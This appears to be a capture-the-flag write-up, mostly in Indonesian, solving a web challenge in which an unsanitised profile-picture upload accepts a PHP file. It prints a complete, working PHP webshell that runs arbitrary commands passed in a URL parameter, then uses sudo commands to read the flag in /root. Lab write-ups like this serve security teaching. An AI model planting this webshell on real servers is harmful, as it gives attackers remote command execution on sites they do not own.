### WRITE UP
![alt text](https://github.com/bebasaja-1/gambar/blob/main/Screenshot%202026-08-14%20095127.png?raw=true)

## Description
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

## Hint
- File upload was not sanitized
- Whenever you get a shell on a remote machine, check `sudo -l`

## Penyelesaian

### 1. Observasi Fitur Upload
![alt text](https://github.com/bebasaja-1/gambar/blob/main/Screenshot%202026-08-14%20101655.png?raw=true)

Pada tahap awal pengerjaan, saya diberikan sebuah tautan (link) menuju sebuah aplikasi web yang menjadi target eksploitasi. Aplikasi tersebut memiliki sebuah fitur yang memungkinkan pengguna untuk mengunggah file gambar berformat PNG guna dijadikan foto profil.

### 2. Analisis Hint
Berdasarkan hint yang diberikan pada soal, saya mengetahui bahwa proses validasi terhadap file yang diunggah (file upload) tidak dilakukan dengan baik atau tidak disanitasi. Berdasarkan informasi tersebut, saya berinisiatif untuk mencoba mengunggah sebuah file PHP webshell guna menguji kerentanan tersebut.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

### 3. Percobaan Upload File PHP Webshell
<img width="696" height="360" alt="Screenshot 2026-08-14 102203" src="https://github.com/user-attachments/assets/1d2a5b0a-a71c-41c6-8aeb-906fdc6ceba5" />

Saya melakukan percobaan untuk mengunggah file PHP webshell melalui fitur upload foto profil tersebut.

<img width="704" height="129" alt="Screenshot 2026-08-14 102212" src="https://github.com/user-attachments/assets/d05d90d9-8225-4c8d-873b-3f245ed17f6b" />

Hasilnya, proses unggah berhasil dilakukan tanpa adanya penolakan dari sistem, baik dari sisi validasi ekstensi maupun tipe konten file.

### 4. Pencarian Flag
<img width="1015" height="253" alt="Screenshot 2026-08-14 102513" src="https://github.com/user-attachments/assets/a1b4cccf-cd19-445b-9d89-cf430dd42cda" />

Setelah file berhasil diunggah, saya melakukan penelusuran pada direktori `/root` dengan command `sudo ls /root` untuk mencari flag.

<img width="991" height="159" alt="Screenshot 2026-08-14 102647" src="https://github.com/user-attachments/assets/86508c5d-cb82-4849-909d-0bb3bc5ba1de" />

Setelah ditemukan, saya menggunakan command `sudo cat /root/flag.txt` untuk melihat isi flag.


